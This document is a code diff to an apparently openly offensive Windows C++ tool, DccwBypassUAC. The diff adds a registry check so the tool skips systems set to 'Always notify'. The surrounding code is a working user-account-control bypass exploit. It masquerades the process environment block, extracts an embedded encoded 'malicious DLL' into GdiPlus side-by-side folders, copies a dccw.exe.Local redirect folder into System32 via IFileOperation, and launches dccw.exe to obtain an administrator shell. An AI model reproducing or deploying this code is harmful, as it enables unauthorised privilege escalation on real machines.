@@ -16,6 +16,9 @@
 #pragma comment(lib, "crypt32.lib") 
 #pragma comment(lib, "Cabinet.lib")
 
+const int MINIMUM_BUILD_VERSION = 7000;
+const DWORD ALWAYS_NOTIFY_UAC_LEVEL = 2;
+
 BOOL MasqueradePEB() {
 
 	typedef struct _UNICODE_STRING {
@@ -425,6 +428,31 @@ std::wstring getBuildNumber() {
 	return value;
 }
 
+DWORD getUACLevel() {
+	HKEY root = HKEY_LOCAL_MACHINE;
+	std::wstring key = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+	std::wstring name = L"ConsentPromptBehaviorAdmin";
+	HKEY hKey;
+	if (RegOpenKeyEx(root, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
+		wprintf(L"Error! The UAC level cannot be determined! Trying the default one...");
+		return 5;
+	}
+
+	DWORD type;
+	DWORD cbData(sizeof(DWORD));
+
+	DWORD value(0);
+	if (RegQueryValueEx(hKey, name.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&value), &cbData) != ERROR_SUCCESS) {
+		RegCloseKey(hKey);
+		wprintf(L"Error! The UAC level cannot be determined! Trying the default one...");
+		return 5;
+	}
+
+	RegCloseKey(hKey);
+
+	return value;
+}
+
 BOOL IFileOperationCopy(LPCWSTR destPath, std::wstring buildVersion) {
 	IFileOperation *fileOperation = NULL;
 	WCHAR dllPath[1024];
@@ -588,8 +616,7 @@ int wmain(int argc, wchar_t* argv[]) {
 	if (argc == 2) {
 
 		std::wstring buildVersion = getBuildNumber();
-
-		if (std::stoi(buildVersion) >= 7000) {
+		if (std::stoi(buildVersion) >= MINIMUM_BUILD_VERSION) {
 			HANDLE hToken;
 			HANDLE hProcess;
 
@@ -616,77 +643,80 @@ int wmain(int argc, wchar_t* argv[]) {
 									(DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
 
 								if (dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
+									if (getUACLevel() != ALWAYS_NOTIFY_UAC_LEVEL) {
+										WIN32_FIND_DATA FindFileData;
+										HANDLE hFind;
+										LPCWSTR folderName;
+										LPCWSTR targetedDirectories = L"C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*";
+										LPCWSTR destPath;
+										GdiPlus32 gdiplus32;
+										LPWSTR version = CharLower(argv[1]);
 
-									WIN32_FIND_DATA FindFileData;
-									HANDLE hFind;
-									LPCWSTR folderName;
-									LPCWSTR targetedDirectories = L"C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*";
-									LPCWSTR destPath;
-									GdiPlus32 gdiplus32;
-									LPWSTR version = CharLower(argv[1]);
+										if (wcscmp(version, L"x86") == 0) {
+											destPath = L"C:\\Windows\\System32";
+											folderName = L"C:\\Windows\\System32\\dccw.exe.Local";
+										}
+										else if (wcscmp(version, L"x64") == 0) {
+											destPath = L"C:\\Windows\\SysWOW64";
+											folderName = L"C:\\Windows\\SysWOW64\\dccw.exe.Local";
+										}
+										else {
+											wprintf(L" [-] Error! You must specify the target architecture: \"x86\" or \"x64\".\n");
+											wprintf(L" For example: \n");
+											wprintf(L" > DccwBypassUAC.exe x86\n");
+											wprintf(L" > DccwBypassUAC.exe x64\n");
+											return 1;
+										}
 
-									if (wcscmp(version, L"x86") == 0) {
-										destPath = L"C:\\Windows\\System32";
-										folderName = L"C:\\Windows\\System32\\dccw.exe.Local";
-									}
-									else if (wcscmp(version, L"x64") == 0) {
-										destPath = L"C:\\Windows\\SysWOW64";
-										folderName = L"C:\\Windows\\SysWOW64\\dccw.exe.Local";
-									}
-									else {
-										wprintf(L" [-] Error! You must specify the target architecture: \"x86\" or \"x64\".\n");
-										wprintf(L" For example: \n");
-										wprintf(L" > DccwBypassUAC.exe x86\n");
-										wprintf(L" > DccwBypassUAC.exe x64\n");
-										return 1;
-									}
+										wprintf(L" [*] Creating temporary folders...\n");
+										if (!createDirectories(targetedDirectories)) {
+											wprintf(L" [-] Error! Cannot create the necessary directories!");
+											return 1;
+										}
 
-									wprintf(L" [*] Creating temporary folders...\n");
-									if (!createDirectories(targetedDirectories)) {
-										wprintf(L" [-] Error! Cannot create the necessary directories!");
-										return 1;
-									}
+										wprintf(L" [*] Extracting the malicious DLL..\n");
+										CHAR *gdiplus = gdiplus32.getEncodedDLL();
+										std::vector <std::wstring> dirNames;
+										dirNames = getDirectories(targetedDirectories);
+										for (int i = 0; i < dirNames.size(); i++) {
+											std::wstring filename(L"\\GdiPlus.dll");
+											std::wstring path = dirNames.at(i) + filename;
+											LPCWSTR finalPath = path.c_str();
+											if (!base64DecodeAndDecompressDLL(gdiplus, finalPath)) {
+												wprintf(L" [-] Error! Cannot extract the malicious DLL!\n");
+												removeFilesAndDirectories(targetedDirectories);
+												return 1;
+											}
+										}
 
-									wprintf(L" [*] Extracting the malicious DLL..\n");
-									CHAR *gdiplus = gdiplus32.getEncodedDLL();
-									std::vector <std::wstring> dirNames;
-									dirNames = getDirectories(targetedDirectories);
-									for (int i = 0; i < dirNames.size(); i++) {
-										std::wstring filename(L"\\GdiPlus.dll");
-										std::wstring path = dirNames.at(i) + filename;
-										LPCWSTR finalPath = path.c_str();
-										if (!base64DecodeAndDecompressDLL(gdiplus, finalPath)) {
-											wprintf(L" [-] Error! Cannot extract the malicious DLL!\n");
+										wprintf(L" [*] Masquerading the PEB...\n");
+										if (!IFileOperationCopy(destPath, buildVersion)) {
 											removeFilesAndDirectories(targetedDirectories);
 											return 1;
 										}
-									}
 
-									wprintf(L" [*] Masquerading the PEB...\n");
-									if (!IFileOperationCopy(destPath, buildVersion)) {
-										removeFilesAndDirectories(targetedDirectories);
-										return 1;
-									}
+										hFind = FindFirstFile(folderName, &FindFileData);
+										if (hFind == INVALID_HANDLE_VALUE) {
+											wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
+											IFileOperationDelete(destPath, buildVersion);
+											return 1;
+										}
+										else {
+											FindClose(hFind);
+										}
 
-									hFind = FindFirstFile(folderName, &FindFileData);
-									if (hFind == INVALID_HANDLE_VALUE) {
-										wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
+										wprintf(L" [*] Starting dccw.exe (cross the fingers and wait to get an Administrator shell)...\n");
+
+										ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\dccw.exe", NULL, NULL, SW_SHOW);
+
 										IFileOperationDelete(destPath, buildVersion);
-										return 1;
+										removeFilesAndDirectories(targetedDirectories);
+
+									} else {
+										//UAC level set to "Always notify"
+										wprintf(L"Damn! The UAC level is set to \"Always notify\"!\n");
 									}
-									else {
-										FindClose(hFind);
-									}
-
-									wprintf(L" [*] Starting dccw.exe (cross the fingers and wait to get an Administrator shell)...\n");
-
-									ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\dccw.exe", NULL, NULL, SW_SHOW);
-
-									IFileOperationDelete(destPath, buildVersion);
-									removeFilesAndDirectories(targetedDirectories);
-
-								}
-								else {
+								} else {
 									// High or System Integrity
 									wprintf(L"You already have Administrator rights! There is no need to execute the script ;)\n");
 								}
@@ -698,7 +728,7 @@ int wmain(int argc, wchar_t* argv[]) {
 				CloseHandle(hToken);
 			}
 		} else {
-			wprintf(L" [-] Error! Version not suported!");
+			wprintf(L" [-] Error! Windows version not suported!");
 		}
 	}
 	else {
